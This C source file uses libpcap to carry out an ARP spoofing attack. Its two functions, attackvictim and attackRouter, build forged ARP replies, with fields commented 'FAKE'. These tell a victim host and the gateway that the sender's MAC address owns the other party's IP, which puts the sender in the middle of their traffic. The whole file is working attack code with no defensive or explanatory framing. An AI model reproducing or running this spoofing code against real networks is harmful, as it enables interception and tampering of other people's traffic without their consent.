#include "myHeader.h"

int setArpHeader(PARP_HEADER arpHeader)
{
	arpHeader->Hardware_type = ntohs(0x0001);
	arpHeader->Protocol_type = ntohs(0x0800);
	arpHeader->Hardware_size = 0x06;
	arpHeader->Protocol_size = 0x04;
	arpHeader->Opcode = ntohs(REPLY);
	return 0;
}
int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
{
	u_char packet[ARP_PACKET_SIZE];
	/* set header */
	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpPacket->arp.src_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));		// FAKE
	memcpy(arpPacket->arp.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_HEADER_SIZE);
	memcpy(packet + ETHERNET_HEADER_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_HEADER_SIZE);
	/* send to victim */
	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}
int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
{
	u_char packet[ARP_PACKET_SIZE];
	/* set header */
	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpPacket->arp.src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));			// FAKE
	memcpy(arpPacket->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_HEADER_SIZE);
	memcpy(packet + ETHERNET_HEADER_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_HEADER_SIZE);
	/* send to router */
	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}